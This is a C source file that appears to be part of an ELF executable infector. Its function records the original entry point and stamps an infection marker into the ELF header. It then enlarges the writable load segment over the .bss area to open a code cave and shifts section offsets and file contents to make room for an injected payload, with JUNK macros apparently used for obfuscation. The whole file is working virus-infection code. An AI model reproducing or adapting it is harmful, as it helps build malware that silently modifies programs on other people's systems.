#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

#include "utils.h"
#include "bss.h"
#include "death.h"
#include "data.h"
#include "syscall.h"

extern int g_start_offset;

int	bss(data_t *data, size_t payload_size) {

	Elf64_Phdr	*phdr = data->elf.phdr;
	Elf64_Shdr	*shdr = data->elf.shdr;
	Elf64_Ehdr	*ehdr = data->elf.ehdr;

	data->cave.old_entry = ehdr->e_entry;

    *(uint32_t *)&ehdr->e_ident[EI_PAD] = MAGIC_NUMBER;

	JUNK;

	size_t bss_len = 0;

	for (size_t i = ehdr->e_phnum; i--;) {
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)) {

			data->cave.offset = phdr[i].p_offset + phdr[i].p_filesz;
			data->cave.addr = phdr[i].p_vaddr + phdr[i].p_filesz;


			bss_len = phdr[i].p_memsz - phdr[i].p_filesz;

			payload_size += bss_len;

			phdr[i].p_filesz += payload_size;
			phdr[i].p_memsz += payload_size;

			data->patch.mprotect_size = phdr[i].p_filesz;

			//phdr[i].p_flags |= PF_X;

			break;

		}

	}

	ehdr->e_shoff += payload_size;

	for (size_t i = ehdr->e_shnum; i--;) {

		//if (shdr[i].sh_addr >= data->cave.addr) {
		//	shdr[i].sh_addr += payload_size;
		//}

		if (shdr[i].sh_offset >= data->cave.offset) {
			shdr[i].sh_offset += payload_size;
		}
		else if (shdr[i].sh_addr + shdr[i].sh_size == data->cave.addr) {
			shdr[i].sh_size += payload_size;
		}
	}

	// solve corrupted elf
	if (data->cave.offset > data->elf.size) {
		return 1;
	}

	JUNK;

	ft_memmove(data->file + data->cave.offset + payload_size,
			data->file + data->cave.offset, data->elf.size - data->cave.offset);

	ft_memset(data->file + data->cave.offset, 0, payload_size);

	data->cave.addr += bss_len;
	data->cave.offset += bss_len;

	g_start_offset = data->cave.offset;
	return 0;
}
